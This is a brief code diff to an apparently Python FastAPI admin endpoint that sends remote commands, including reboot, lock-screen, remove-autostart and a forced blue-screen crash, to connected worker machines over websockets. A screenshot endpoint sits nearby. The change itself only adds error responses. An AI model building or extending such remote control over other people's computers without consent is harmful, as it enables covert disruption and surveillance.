@@ -476,11 +476,12 @@ async def send_command(user_id: int, data: dict, _=Depends(auth_utils.require_ad
     if cmd not in ("quit", "remove-autostart", "reboot", "lock-screen", "bsod"):
         raise HTTPException(status_code=400, detail="Unknown command")
     worker_ws = _worker_commands_ws.get(user_id)
-    if worker_ws:
-        try:
-            await worker_ws.send_text(cmd)
-        except Exception:
-            pass
+    if not worker_ws:
+        raise HTTPException(status_code=503, detail="Воркер не подключён")
+    try:
+        await worker_ws.send_text(cmd)
+    except Exception:
+        raise HTTPException(status_code=503, detail="Ошибка отправки команды")
 
 
 @router.get("/screenshot/pending")
